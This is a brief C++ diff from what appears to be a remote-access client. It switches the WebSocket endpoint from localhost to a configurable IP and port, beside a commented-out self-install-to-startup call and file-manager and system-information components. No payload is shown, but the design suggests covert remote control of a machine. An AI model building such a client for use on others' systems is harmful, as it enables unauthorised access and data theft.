@@ -30,8 +30,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
         while (isConnecting) {
             std::unordered_map<std::string, std::function<void(nlohmann::json &)>> actionMap;
             //Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
-            std::string uri = "ws://localhost:3055";
-
+            std::string uri = "ws://" + std::string(IP) + ":" + std::to_string(PORT);
             ClientSocket clientSocket(uri, actionMap);
             Information information(clientSocket);
             FileManager fileManager(clientSocket);
